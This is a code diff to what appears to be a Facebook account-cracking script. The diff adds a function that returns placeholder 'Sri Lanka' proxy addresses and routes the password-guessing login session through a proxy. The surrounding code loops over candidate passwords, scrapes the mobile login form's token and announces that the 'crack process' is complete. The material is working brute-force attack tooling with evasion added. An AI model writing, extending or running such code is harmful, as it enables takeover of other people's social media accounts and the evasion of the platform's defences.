@@ -875,6 +875,13 @@ def xp():
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 
+def get_sri_lanka_proxy():
+        proxies = [
+        'http://123.456.789.101:8080',  # Replace with actual proxy
+        'http://123.456.789.102:8080',  # Replace with actual proxy
+        'http://123.456.789.103:8080' ]
+        return proxies
+proxy = get_sri_lanka_proxy()[0]  # Replace [0] with the index of the desired proxy
 
 browser_version1 = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
 build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
@@ -1201,10 +1208,10 @@ def m6(idf,pw):
  try:
   for ps in pw:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
-            #sys.stdout.flush()
-   pro = random.choice(ugen)
+   proxies = {
+    'http': proxy,
+    'https': proxy}
+   session.proxies.update(proxies)
    free_fb = session.get('https://m.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
